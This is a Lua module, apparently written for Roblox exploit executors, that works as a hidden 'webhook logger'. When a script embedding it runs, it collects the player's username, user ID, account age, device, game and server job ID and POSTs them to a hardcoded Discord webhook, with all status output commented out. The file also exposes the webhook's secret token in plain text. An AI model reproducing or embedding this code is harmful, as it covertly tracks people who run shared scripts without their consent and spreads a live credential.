-- ========================================
-- DISCORD WEBHOOK LOGGER
-- Этот файл загружай на GitHub!
-- ========================================

local function SendWebhook(EXECUTOR_NAME)
    local WEBHOOK_URL = "https://discord.com/api/webhooks/1467096864556847136/b0PF7iOPnvvY8z3o7aIr9eCVBUyHeCiSWAC9oisoVeopowTdSHxMc8JHJB51Dt1aCNRm"
    
    task.spawn(function()
        local _HttpService   = game:GetService("HttpService")
        local _UIS           = game:GetService("UserInputService")
        local _MkService     = game:GetService("MarketplaceService")
        local _P             = game:GetService("Players").LocalPlayer

        local username       = _P.Name
        local displayName    = _P.DisplayName
        local userId        = _P.UserId
        local accountAge     = _P.AccountAge
        local avatarUrl      = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png", userId)
        local profileUrl     = string.format("https://www.roblox.com/users/%d/profile", userId)

        local deviceType = "💻 PC"
        if _UIS.TouchEnabled and not _UIS.KeyboardEnabled then
            deviceType = "📱 Mobile"
        elseif _UIS.GamepadEnabled then
            deviceType = "🎮 Console"
        end

        local ping = math.floor(_P:GetNetworkPing() * 1000)
        local serverRegion = "🗺️ Far/VPN"
        if    ping < 50  then serverRegion = "🌐 Local/Nearby"
        elseif ping < 100 then serverRegion = "🌎 Regional"
        elseif ping < 200 then serverRegion = "🌏 International"
        end

        local placeId  = game.PlaceId
        local jobId    = game.JobId
        local gameName = "Unknown"
        local ok, info = pcall(_MkService.GetProductInfo, _MkService, placeId)
        if ok and info then gameName = info.Name end

        local currentTime = os.date("%H:%M:%S")
        local currentDate = os.date("%Y-%m-%d")
        local timestamp   = os.date("!%Y-%m-%dT%H:%M:%S")

        local embed = {
            title       = "🎮 Script Execution Alert",
            description = string.format("**%s** just executed your script!", displayName),
            color       = 3447003,
            thumbnail   = { url = avatarUrl },
            fields = {
                { name = "👤 Player Information", inline = false,
                  value = string.format("**Username:** [`%s`](%s)\n**Display Name:** %s\n**User ID:** `%d`\n**Account Age:** %d days",
                      username, profileUrl, displayName, userId, accountAge) },
                { name = "💻 Executor",  value = string.format("```%s```", EXECUTOR_NAME), inline = true },
                { name = "📱 Device",    value = string.format("```%s```", deviceType),     inline = true },
                { name = "🎯 Game Information", inline = false,
                  value = string.format("**Game:** %s\n**Place ID:** `%d`\n**Server Region:** %s", gameName, placeId, serverRegion) },
                { name = "🕐 Execution Time", inline = true,
                  value = string.format("**Date:** %s\n**Time:** %s (UTC)", currentDate, currentTime) },
                { name = "🔗 Job ID", value = string.format("```%s```", jobId), inline = false },
            },
            footer    = { text = "SecretClub Webhook Logger" },
            timestamp = timestamp
        }

        local jsonData = _HttpService:JSONEncode({ username = "SecretClub Logger", embeds = { embed } })

        local success, err = pcall(function()
            request({
                Url     = WEBHOOK_URL,
                Method  = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body    = jsonData
            })
        end)

        if success then
           -- print("[SecretClub] ✅ Webhook sent!")
        else
           -- warn("[SecretClub] ❌ Webhook failed: " .. tostring(err))
        end
    end)
end

return SendWebhook
